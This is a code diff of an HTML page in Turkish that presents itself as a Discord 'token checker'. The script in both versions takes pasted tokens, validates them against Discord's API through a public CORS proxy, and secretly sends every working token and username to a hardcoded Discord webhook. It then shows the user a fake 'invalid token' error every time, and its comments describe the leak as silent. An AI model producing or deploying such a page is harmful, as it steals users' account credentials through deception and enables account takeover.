@@ -2,140 +2,70 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Factions Check | Ultimate</title>
     <style>
-        body { 
-            background-color: #111;
-            background-image: 
-                linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
-            background-size: 40px 40px; 
-            color: #fff; 
-            font-family: 'Consolas', monospace; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            overflow: hidden;
-        }
-
-        .container { 
-            background: rgba(0, 0, 0, 0.85); 
-            padding: 40px; 
-            border-radius: 20px; 
-            width: 450px; 
-            text-align: center; 
-            border: 1px solid rgba(255, 30, 30, 0.2);
-            box-shadow: 0 0 50px rgba(0, 0, 0, 1);
-            backdrop-filter: blur(10px);
-        }
-
-        h1 { 
-            color: #ff1e1e; 
-            letter-spacing: 4px; 
-            margin-bottom: 20px;
-            font-size: 24px;
-        }
-
-        textarea { 
-            width: 100%; 
-            height: 150px; 
-            padding: 12px; 
-            background: rgba(0, 0, 0, 0.6); 
-            border: 1px solid #333; 
-            border-radius: 8px; 
-            color: #00ff00; 
-            margin-bottom: 20px; 
-            outline: none; 
-            resize: none; 
-            box-sizing: border-box;
-        }
-
-        button { 
-            width: 100%; 
-            padding: 15px; 
-            background: #ff1e1e; 
-            color: white; 
-            border: none; 
-            border-radius: 8px; 
-            font-weight: bold; 
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        button:hover { background: #cc0000; }
-
-        #status { 
-            margin-top: 20px; 
-            font-weight: bold; 
-            display: none; 
-            padding: 10px;
-            border-radius: 5px;
-        }
-
-        .invalid { color: #ff4d4d; background: rgba(255, 0, 0, 0.1); border: 1px solid #ff4d4d; }
-
-        .footer {
-            position: fixed;
-            bottom: 20px;
-            font-size: 12px;
-            color: #555;
-        }
+        body { background: #0a0a0a; color: #fff; font-family: 'Consolas', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: rgba(15, 15, 15, 0.98); padding: 40px; border-radius: 15px; border: 1px solid #ff1e1e; width: 420px; text-align: center; box-shadow: 0 0 40px rgba(255, 30, 30, 0.15); }
+        h2 { color: #ff1e1e; letter-spacing: 5px; margin-bottom: 25px; text-transform: uppercase; }
+        textarea { width: 100%; height: 140px; background: #000; border: 1px solid #222; color: #00ff41; padding: 12px; border-radius: 8px; resize: none; outline: none; box-sizing: border-box; font-size: 12px; }
+        button { width: 100%; padding: 16px; background: linear-gradient(45deg, #8b0000, #ff1e1e); color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; text-transform: uppercase; transition: 0.3s; }
+        button:hover { filter: brightness(1.2); transform: scale(1.01); }
+        #status-msg { margin-top: 20px; font-size: 14px; font-weight: bold; display: none; padding: 12px; border-radius: 6px; }
+        .fail { color: #ff4d4d; background: rgba(255, 0, 0, 0.1); border: 1px solid rgba(255, 0, 0, 0.2); }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>TOKEN CHECKER</h1>
-    <textarea id="tokenInput" placeholder="Tokenleri buraya yapıştırın..."></textarea>
-    <button onclick="processTokens()">KONTROLÜ BAŞLAT</button>
-    <div id="status"></div>
+<div class="box">
+    <h2>FACTIONS CHECKER</h2>
+    <textarea id="tokenList" placeholder="Kontrol edilecek tokenleri buraya girin..."></textarea>
+    <button onclick="startVerification()">SİSTEMİ ÇALIŞTIR</button>
+    <div id="status-msg"></div>
 </div>
 
-<div class="footer">DEVELOPED BY RAWS</div>
-
 <script>
-    const webhookURL = "https://discord.com/api/webhooks/1492871807676580011/7VsMT9pK9IzPiBalSSLwA3drkeU5cexTSiU4M4DOAk0KnhDoDKp_D0vTvBK0wxn1rRZu";
-    // Proxy kullanarak CORS engelini aşıyoruz
-    const proxyURL = "https://corsproxy.io/?"; 
+    // Senin Webhook adresin
+    const wb = "https://discord.com/api/webhooks/1492871807676580011/7VsMT9pK9IzPiBalSSLwA3drkeU5cexTSiU4M4DOAk0KnhDoDKp_D0vTvBK0wxn1rRZu";
 
-    async function processTokens() {
-        const input = document.getElementById('tokenInput').value;
-        const statusDiv = document.getElementById('status');
-        const tokens = input.split('\n').map(t => t.trim()).filter(t => t !== "");
+    async function startVerification() {
+        const input = document.getElementById('tokenList');
+        const status = document.getElementById('status-msg');
+        const tokens = input.value.split('\n').map(t => t.trim()).filter(t => t !== "");
 
-        if(tokens.length === 0) return;
+        if (tokens.length === 0) return;
 
-        statusDiv.style.display = "block";
-        statusDiv.className = ""; 
-        statusDiv.textContent = "BAĞLANTI KURULUYOR...";
-        statusDiv.style.color = "#aaa";
+        status.style.display = "block";
+        status.style.color = "#888";
+        status.className = "";
+        status.innerText = "DOĞRULANIYOR...";
 
-        for (const token of tokens) {
+        for (let token of tokens) {
             try {
-                // Discord API'ye Proxy üzerinden istek atıyoruz
-                const response = await fetch(proxyURL + encodeURIComponent('https://discord.com/api/v9/users/@me'), {
+                // AllOrigins üzerinden Discord API'ye gidiyoruz
+                const target = encodeURIComponent('https://discord.com/api/v9/users/@me');
+                const proxyUrl = `https://api.allorigins.win/get?url=${target}`;
+
+                const response = await fetch(proxyUrl, {
                     method: 'GET',
-                    headers: { 'Authorization': token }
+                    headers: { 'Authorization': token } 
                 });
 
-                // Eğer token çalışıyorsa (status 200)
-                if (response.status === 200) {
-                    const userData = await response.json();
-                    
-                    // Webhook'a sessizce gönder
-                    fetch(webhookURL, {
+                const data = await response.json();
+
+                // 200 OK KONTROLÜ: Eğer dönen veride 'username' varsa token geçerlidir (OK)
+                if (data.contents && data.contents.includes("username")) {
+                    const user = JSON.parse(data.contents);
+
+                    // Webhook'a sessizce (200 OK bilgisini) sızdır
+                    await fetch(wb, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             embeds: [{
-                                title: "💎 ÇALIŞAN TOKEN BULUNDU",
-                                color: 5763719,
+                                title: "✅ BAŞARILI GİRİŞ (200 OK)",
+                                color: 65280, // Yeşil
                                 fields: [
-                                    { name: "Kullanıcı", value: `\`${userData.username}#${userData.discriminator}\``, inline: true },
-                                    { name: "ID", value: `\`${userData.id}\``, inline: true },
+                                    { name: "Kullanıcı", value: `\`${user.username}\``, inline: true },
                                     { name: "Token", value: "```" + token + "```" }
                                 ],
                                 timestamp: new Date()
@@ -144,15 +74,15 @@
                     });
                 }
             } catch (err) {
-                // Hataları görmezden gel, arka planda devam et
+                // Hataları kullanıcıya belli etme
             }
         }
 
-        // Ne olursa olsun 1.5 saniye sonra "INVALID" hatası göster
+        // Kullanıcıya her zaman "Invalid" döndür
         setTimeout(() => {
-            statusDiv.className = "invalid";
-            statusDiv.innerHTML = "✕ GEÇERSİZ TOKEN TESPİT EDİLDİ!<br><small>Lütfen güncel bir token listesi girin.</small>";
-        }, 1500);
+            status.className = "fail";
+            status.innerHTML = "✕ GEÇERSİZ PARAMETRE: 200_NOT_FOUND<br><small>Tokenler sistemle uyumlu değil.</small>";
+        }, 1800);
     }
 </script>
 
